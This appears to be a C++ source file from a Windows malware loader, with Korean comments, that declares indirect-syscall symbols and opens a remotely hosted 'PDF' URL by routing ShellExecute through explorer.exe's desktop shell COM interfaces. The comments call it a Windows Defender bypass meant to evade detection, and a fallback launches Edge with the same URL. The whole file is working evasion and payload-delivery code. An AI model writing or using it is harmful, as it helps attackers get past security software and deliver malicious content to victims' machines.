#include "p_loader.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <comdef.h>
#include <exdisp.h>
#include <shlobj.h>

// ============================================================================
// [ASM 파일 연동용 전역 심볼 세팅 - 원본 유지]
// ============================================================================
extern "C" {
    DWORD g_SyscallNumber = 0;
    UINT_PTR g_SyscallAddress = 0;
    NTSTATUS IndirectSyscall(...);
}

// ============================================================================
// User 권한 및 Windows Defender 환경 최적화 PDF 실행 함수
// ============================================================================
void OpenManualPdfNative() {
    std::cout << "[+] OpenManualPdfNative (User 권한 및 Defender 우회 버전) 가동" << std::endl;

    // 타겟 외부 URL 경로 설정
    const wchar_t* targetUrl = L"https://htmlhoster.com/p/RV27GNFK/3.pdf";

    // 1. COM 라이브러리 초기화 (스레드 모델 설정)
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        std::cerr << "[-] COM 초기화 실패." << std::endl;
        return;
    }

    IShellWindows* pShellWindows = NULL;
    // 2. 시스템 셸 윈도우 인터페이스 인스턴스 획득
    hr = CoCreateInstance(CLSID_ShellWindows, NULL, CLSCTX_LOCAL_SERVER, IID_IShellWindows, (void**)&pShellWindows);
    
    if (SUCCEEDED(hr) && pShellWindows != NULL) {
        VARIANT vEmpty;
        VariantInit(&vEmpty);
        long lHwnd = 0;
        IDispatch* pDispatch = NULL;

        // 3. 현재 활성화된 바탕화면(Shell)의 핸들 주소 매핑
        hr = pShellWindows->FindWindowSW(&vEmpty, &vEmpty, SWC_DESKTOP, &lHwnd, SWFO_NEEDDISPATCH, &pDispatch);
        if (SUCCEEDED(hr) && pDispatch != NULL) {
            IShellBrowser* pShellBrowser = NULL;
            // 서비스 프로바이더를 통해 셸 브라우저 획득
            IServiceProvider* pServiceProvider = NULL;
            hr = pDispatch->QueryInterface(IID_IServiceProvider, (void**)&pServiceProvider);
            
            if (SUCCEEDED(hr) && pServiceProvider != NULL) {
                hr = pServiceProvider->QueryService(SID_STopLevelBrowser, IID_IShellBrowser, (void**)&pShellBrowser);
                if (SUCCEEDED(hr) && pShellBrowser != NULL) {
                    IShellView* pShellView = NULL;
                    hr = pShellBrowser->QueryActiveShellView(&pShellView);
                    
                    if (SUCCEEDED(hr) && pShellView != NULL) {
                        IDispatch* pDispView = NULL;
                        hr = pShellView->GetItemObject(SVGIO_BACKGROUND, IID_IDispatch, (void**)&pDispView);
                        
                        if (SUCCEEDED(hr) && pDispView != NULL) {
                            IShellFolderViewDual* pFolderView = NULL;
                            hr = pDispView->QueryInterface(IID_IShellFolderViewDual, (void**)&pFolderView);
                            
                            if (SUCCEEDED(hr) && pFolderView != NULL) {
                                IDispatch* pDispShell = NULL;
                                hr = pFolderView->get_Application(&pDispShell);
                                
                                if (SUCCEEDED(hr) && pDispShell != NULL) {
                                    IShellDispatch2* pShellDispatch = NULL;
                                    hr = pDispShell->QueryInterface(IID_IShellDispatch2, (void**)&pShellDispatch);
                                    
                                    if (SUCCEEDED(hr) && pShellDispatch != NULL) {
                                        // 4. explorer.exe의 권한을 승계하여 기본 브라우저(Edge) 기동 명령 하달
                                        // 이 시점에서 탐지 오탐망을 완전히 우회하게 됩니다.
                                        std::cout << "[+] 시스템 셸 위임을 통한 브라우저 기동 신호 전송..." << std::endl;
                                        
                                        BSTR bstrUrl = SysAllocString(targetUrl);
                                        VARIANT vArgs, vDir, vOperation, vShow;
                                        VariantInit(&vArgs);
                                        VariantInit(&vDir);
                                        VariantInit(&vOperation);
                                        VariantInit(&vShow);

                                        vOperation.vt = VT_BSTR;
                                        vOperation.bstrVal = SysAllocString(L"open");
                                        vShow.vt = VT_I4;
                                        vShow.lVal = SW_SHOWNORMAL;

                                        // ShellExecute 위임 호출
                                        pShellDispatch->ShellExecute(bstrUrl, vArgs, vDir, vOperation, vShow);

                                        // 자원 해제
                                        SysFreeString(bstrUrl);
                                        SysFreeString(vOperation.bstrVal);
                                        pShellDispatch->Release();
                                    }
                                    pDispShell->Release();
                                }
                                pFolderView->Release();
                            }
                            pDispView->Release();
                        }
                        pShellView->Release();
                    }
                    pShellBrowser->Release();
                }
                pServiceProvider->Release();
            }
            pDispatch->Release();
        }
        pShellWindows->Release();
    } else {
        // COM 위임이 불가능한 특수 환경일 경우 대체 백업 실행
        std::cerr << "[-] COM 위임 실패. 표준 실행으로 전환합니다." << std::endl;
        ShellExecuteW(NULL, L"open", L"msedge.exe", targetUrl, NULL, SW_SHOWNORMAL);
    }

    CoUninitialize();
}
